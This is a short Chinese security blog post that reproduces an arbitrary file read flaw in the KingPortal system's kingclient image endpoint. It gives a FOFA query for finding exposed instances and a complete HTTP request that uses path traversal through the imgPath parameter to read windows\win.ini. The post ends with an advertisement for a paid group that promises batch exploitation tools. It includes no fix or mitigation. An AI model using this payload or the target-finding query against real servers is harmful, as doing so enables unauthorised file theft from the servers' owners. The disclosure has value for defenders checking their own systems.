#  KingPortal开发系统 kingclient 任意文件读取漏洞复现及POC   
原创 CatalyzeSec  CatalyzeSec   2024-11-01 22:35  
  
FOFA  
```
title="KingPortal"
```  
# 漏洞复现  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/EqMwaEZz0ykPLziaN5OCupic7a4YOeevfYZ7vqaUfJnm3x07r4sBoA58PLz6fa2wsH8FWuHKyT0VlzySHtobBspg/640?wx_fmt=other&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/EqMwaEZz0ykPLziaN5OCupic7a4YOeevfYyibnjAf15HHa7AWJlCmYOibs7RWo2hR1Nyia5466oKy4mia0cY6UorEdng/640?wx_fmt=other&from=appmsg "")  
  
POC  
```
GET /kingclient/img?imgPath=..\..\..\..\..\..\..\..\..\..\..\..\windows\win.ini HTTP/1.1
Host: 
Accept-Language: zh-CN
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```  
  
nuclei运行结果  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/EqMwaEZz0ykPLziaN5OCupic7a4YOeevfYKKXXoU9RbobGlucMiaObWY6K6aKiagibptzwbA53EBGr5XaQhnibsQevdA/640?wx_fmt=other&from=appmsg "")  
  
**知识星球**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/EqMwaEZz0ykPLziaN5OCupic7a4YOeevfYMTAIOZFQPG6WgJ216iaWqkwbfw0kAibticiaY0LTtzj5Q5FJ7eRqlkib0GQ/640?wx_fmt=other&from=appmsg "")  
  
  
高质量安全知识星球社区，致力于漏洞挖掘，渗透技巧，安全资料，星球承诺会持续更新0/1/NDay及对应的批量利用工具，团队内部漏洞库，内外网攻防技巧，你所需要的各类安全工具和资料以及团队师傅们最新的学习研究成果。分享行业内最新动态，解答交流各类技术问题。  
涉及方向包括Web渗透、免杀绕过、红蓝攻防、代码审计、应急响应、安全培训、CTF、小白入门、职业规划和疑难解答。**CatalyzeSec**  
，安全技术水平的催化者，星球针对成员的技术问题，快速提供思考方向及解决方案，并为星友提供多种方向的学习资料、安全工具、POC&EXP以及各种学习笔记等，以引导者和催化剂的方式助力安全技术水平的提升。  
我们是一个快速成长的team，团队的发展方向与每一位星友的学习方向密切相关，加入我们，一起成为更好的自己！  
PS：随着星球内知识的积累，人员的增加，  
星球价格也会随之增加，前一百位加入我们的师傅可享受99元朋友价！  
  
**微信群专属推送机器人**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/EqMwaEZz0ykPLziaN5OCupic7a4YOeevfYJLK71cRcC5PG8Ne8w8zwFh6AAjaQBA26Tx7gZ6jjZdIZl1iavYbHLGQ/640?wx_fmt=other&from=appmsg "")  
  
  
